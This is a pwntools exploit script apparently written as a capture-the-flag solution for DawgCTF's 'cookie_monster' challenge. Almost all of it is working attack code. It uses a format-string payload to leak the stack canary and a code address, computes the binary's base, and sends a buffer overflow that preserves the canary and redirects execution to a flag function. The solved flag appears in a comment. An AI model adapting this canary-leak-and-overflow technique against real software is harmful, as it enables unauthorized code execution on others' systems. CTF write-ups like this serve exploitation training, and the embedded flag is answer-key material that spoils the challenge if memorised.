from pwn import *
import signal
import sys

# Init config
prog_name = './cookie_monster'
context.binary = prog_name 
## init of python
debug = int(sys.argv[1])
online=False
if( debug == 0):
  r = remote("ctf.umbccd.io", 4200)
  online=True
elif(debug == 1):
  r = process(prog_name)

def halt():
  while True:
    log.info( r.recvline() )

# or if you have issue, use interactive but instead you need to open it in another terminal
def interactive():
  if not online:
    print( """/usr/bin/gdb -q  {0} {1}""".format( r.argv[0], r.pid ) )
  r.interactive()


def pwn():
  r.recvuntil("Oh hello there, what's your name?")

  if not online:
    r.sendline("%9$p")
    r.recvuntil("Hello, ")
    cookie = int(r.recvline().rstrip(), 16) >> (32)
    log.info("[+] cookie 0x{0:x}".format(cookie))

    gdb.attach(r, '''
      set follow-fork-mode parent
      #c
      ''')

    buff = "A"*8
    buff += "BBBBB"
    buff += p32(cookie)
    buff += "B"*8
    r.sendline(buff)
    r.interactive()
    return

  r.sendline("%9$p%p")
  r.recvuntil("Hello, ")
  buff = r.recvline().rstrip().split("0x")
  print(buff)
  cookie = int(buff[1], 16) >> 32
  leak = int(buff[2], 16)
  base_text = leak - 0x2082
  offset_flag = 0x11b5 + base_text

  log.info("[+] cookie 0x{0:x}".format(cookie))
  log.info("[+] leak 0x{0:x}".format(leak))
  log.info("[+] base text 0x{0:x}".format(base_text))
  log.info("[+] flag 0x{0:x}".format(offset_flag))

  buff = "A"*8
  buff += "BBBBB"
  buff += p32(cookie)
  buff += "B"*8
  buff += p64(offset_flag)
  r.sendline(buff)

  r.interactive()
  return
  # DawgCTF{oM_n0m_NOm_I_li3k_c0oOoki3s}


pwn()

